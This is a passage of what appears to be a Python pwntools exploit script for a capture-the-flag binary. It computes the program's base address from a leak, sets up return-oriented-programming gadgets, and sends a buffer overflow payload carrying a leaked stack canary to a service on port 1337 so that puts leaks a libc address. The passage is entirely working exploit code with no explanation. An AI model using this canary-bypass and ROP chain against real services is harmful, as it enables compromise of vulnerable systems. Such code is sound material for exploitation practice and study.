...
pie_base = u64(pie+b'\x00\x00')-0x23d9
print(f'code base : {hex(pie_base)}')

### gadget
pop_rdi = pie_base + 0x2473
puts = pie_base +0x1150
puts_got = pie_base + 0x4f60

### leak libc base using puts(got)
r = remote('0.0.0.0','1337')
r.send(b'a'*0x28+p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts))
r.recvuntil(b'Leaving!\n')
